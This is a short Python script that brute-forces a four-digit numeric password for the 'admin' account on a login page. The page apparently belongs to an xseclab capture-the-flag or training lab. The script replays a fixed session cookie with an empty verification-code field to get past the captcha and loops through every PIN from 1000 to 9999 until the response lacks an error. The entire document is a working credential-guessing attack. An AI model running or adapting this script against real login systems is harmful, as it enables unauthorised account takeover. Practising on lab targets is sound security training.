#!/usr/bin/env python3.4

import requests, threading

s = requests.session()
header = {
'Cookie':'saeut=124.89.2.88.1434295791298139; PHPSESSID=cce5635812b7a8cad07ae7f41b2f4598',
}
value = {
		'username':'admin',
		'pwd':1234,
		'vcode':'',
}

for i in range(1000, 10000):
	value['pwd'] = i
	r = s.post('http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/login.php',headers=header,data=value)
	r.encoding = 'utf-8'
	if 'error' not in r.text:
		print('find pwd: %d ' % i)
		print(r.text)
		exit()